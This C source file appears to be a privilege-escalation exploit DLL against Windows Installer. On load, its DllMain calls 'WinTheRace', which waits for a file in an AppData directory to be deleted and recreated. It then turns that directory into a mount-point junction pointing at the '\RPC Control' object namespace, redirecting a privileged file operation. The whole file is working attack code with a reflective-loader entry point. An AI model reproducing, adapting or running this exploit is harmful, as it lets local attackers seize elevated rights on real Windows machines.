#include "windows_installer_privesc.h"
#include <stdio.h>
#include <stdlib.h>

BOOL CreateMountPoint(LPCWSTR pwszPath, LPCWSTR pwszTarget, LPCWSTR pwszPrintName)
{
	PWCHAR pwszTmpTarget = NULL;
	PREPARSE_DATA_BUFFER pReparseBuffer = NULL;
	BOOL ret = FALSE;

	do
	{
		SIZE_T ccTargetSize = wcslen(pwszTarget);
		if (ccTargetSize == 0)
			DBGPRINT_AND_BREAK(L"Target size is zero");
		if (ccTargetSize > MAX_PATH)
			DBGPRINT_AND_BREAK(L"Target size is greater then MAX_PATH (MAX_PATH=%zu, Size=%zu)", MAX_PATH, ccTargetSize);

		LPCWSTR pwszNewTarget = pwszTarget;
		if (pwszTarget[0] != L'\\')
		{
			LPCWSTR wszPrefix = L"\\??\\";
			ccTargetSize += wcslen(wszPrefix);
			pwszTmpTarget = (PWCHAR)_malloca((ccTargetSize + 1) * sizeof(WCHAR));
			if (!pwszTmpTarget)
				DBGPRINT_AND_BREAK(L"Could not allocate memory for pwszTmpTarget");
			StringCbCopyW(pwszTmpTarget, (wcslen(wszPrefix) + 1) * sizeof(WCHAR), wszPrefix);
			StringCbCatW(pwszTmpTarget, (ccTargetSize + 1) * sizeof(WCHAR), pwszTarget);
			pwszNewTarget = pwszTmpTarget;
		}

		SIZE_T cbTargetSize = ccTargetSize * sizeof(WCHAR);
		SIZE_T cbPrintNameSize = wcslen(pwszPrintName) * sizeof(WCHAR);
		SIZE_T cbReparseBufferSize = 8 + cbTargetSize + 2 + cbPrintNameSize + 2;
		// Make sure the buffer is not larger than USHRT_MAX to avoid any unwanted value when it gets casted to USHORT later
		// Note that this test also makes sure that Target and PrintName are also not larger than USHRT_MAX
		if (cbReparseBufferSize > USHRT_MAX)
			DBGPRINT_AND_BREAK(L"Reparse buffer is too large (USHRT_MAX=%zu, Size=%zu)", USHRT_MAX, cbReparseBufferSize);
		SIZE_T cbTotalReparseDataBufferSize = cbReparseBufferSize + REPARSE_DATA_BUFFER_HEADER_LENGTH;
		// Same sanity check for the Total Size, which will be casted to DWORD later
		if (cbTotalReparseDataBufferSize > ULONG_MAX)
			DBGPRINT_AND_BREAK(L"Total Reparse buffer is too large (ULONG_MAX=%zu, Size=%zu)", ULONG_MAX, cbTotalReparseDataBufferSize);
		pReparseBuffer = (PREPARSE_DATA_BUFFER) _malloca(cbTotalReparseDataBufferSize);
		if (!pReparseBuffer)
			DBGPRINT_AND_BREAK(L"Could not allocate memory for the Reparse Data Buffer");

		pReparseBuffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
		pReparseBuffer->ReparseDataLength = (USHORT)cbReparseBufferSize;
		pReparseBuffer->Reserved = 0;

		pReparseBuffer->MountPointReparseBuffer.SubstituteNameOffset = 0;
		pReparseBuffer->MountPointReparseBuffer.SubstituteNameLength = (USHORT)cbTargetSize;
		StringCbCopyW(pReparseBuffer->MountPointReparseBuffer.PathBuffer, cbTargetSize + 2, pwszNewTarget);
		pReparseBuffer->MountPointReparseBuffer.PrintNameOffset = (USHORT)cbTargetSize + 2;
		pReparseBuffer->MountPointReparseBuffer.PrintNameLength = (USHORT) cbPrintNameSize;
		StringCbCopyW(pReparseBuffer->MountPointReparseBuffer.PathBuffer + wcslen(pwszNewTarget) + 1, cbPrintNameSize + 2, pwszPrintName);

		HANDLE hDevice = CreateFileW(pwszPath,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			0,
			OPEN_EXISTING,
			FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
			0
		);
		if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
			DBGPRINT_AND_BREAK(L"hDevice handle is not a valid handle");

		DWORD cb;
		ret = DeviceIoControl(hDevice, FSCTL_SET_REPARSE_POINT, pReparseBuffer, (DWORD)cbTotalReparseDataBufferSize, NULL, 0, &cb, NULL);
		if (!ret)
			DBGPRINT_AND_BREAK(L"DeviceIoControl error while creating reparse point at \"%s\" to \"%s\"", pwszPath, pwszNewTarget);
	} while (0);

	if(pwszTmpTarget)
		_freea(pwszTmpTarget);

	if (pReparseBuffer)
		_freea(pReparseBuffer);

	return ret;
}

DWORD WinTheRace(LPVOID lpParam)
{
	PWCHAR pszAppDataDirPath = NULL;
	DWORD ret = -1;

	do
	{
		DBGPRINT(L"in WinTheRace()");
		DBGPRINT(L"lpParam: 0x%p", lpParam);

		LPCWSTR pszAppDataFilePath = (LPCWSTR)lpParam;
		SIZE_T cbSize = wcsnlen_s(pszAppDataFilePath, MAX_PATH);
		if (cbSize >= MAX_PATH)
			DBGPRINT_AND_BREAK(L"pszAppDataFilePath is too large (MAX_PATH=%zu, size=%zu)", MAX_PATH, cbSize);
		DBGPRINT(L"pszAppDataFilePath (size=%zu): %s", cbSize, pszAppDataFilePath);

		PCWSTR pszFileName = wcsrchr(pszAppDataFilePath, L'\\');
		if (!pszFileName)
			DBGPRINT_AND_BREAK(L"pszAppDataFilePath is not a file path: \"%s\"", pszAppDataFilePath);
		pszAppDataDirPath = (PWCHAR)_malloca((SIZE_T)(pszFileName - pszAppDataFilePath + 1) * sizeof(WCHAR));
		if (!pszAppDataDirPath)
			DBGPRINT_AND_BREAK(L"Could not allocate memory for pszAppDataDirPath");
		StringCbCopyW(pszAppDataDirPath, (SIZE_T)(pszFileName - pszAppDataFilePath + 1) * sizeof(WCHAR), pszAppDataFilePath);
		
		HANDLE file1 = INVALID_HANDLE_VALUE;
		HANDLE file2 = INVALID_HANDLE_VALUE;
		while (TRUE)
		{
			if (GetFileAttributes(pszAppDataFilePath) == INVALID_FILE_ATTRIBUTES)
			//if ((file1 = CreateFileW(pszAppDataFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT, 0)) == INVALID_HANDLE_VALUE)
			{
				//DBGPRINT(L"\"%s\" has just been deleted", pszAppDataFilePath);
				while (TRUE)
				{
					if (GetFileAttributes(pszAppDataFilePath) != INVALID_FILE_ATTRIBUTES)
					//if ((file2 = CreateFileW(pszAppDataFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT, 0)) != INVALID_HANDLE_VALUE)
					{
						//DBGPRINT(L"\"%s\" has just been recreated", pszAppDataFilePath);
						if (!CreateMountPoint(pszAppDataDirPath, L"\\RPC Control", L""))
							DBGPRINT_AND_BREAK(L"Cannot create mount point from \"%s\" to \"\\RPC Control\"", pszAppDataDirPath);
						DBGPRINT(L"Successfully created mount point from \"%s\" to \"\\RPC Control\"", pszAppDataDirPath);
						ret = 0;
						break;
					}
				}
				//if (file2 != INVALID_HANDLE_VALUE)
				//	CloseHandle(file2);
				break;
			}
			//if (file1 != INVALID_HANDLE_VALUE)
			//	CloseHandle(file1);
		}
		break;
	} while (0);

	if (pszAppDataDirPath)
		_freea(pszAppDataDirPath);

	return ret;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
		{
			*(HMODULE*)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		DBGPRINT(L"in DllMain() - DLL_PROCESS_ATTACH");
		WinTheRace(lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}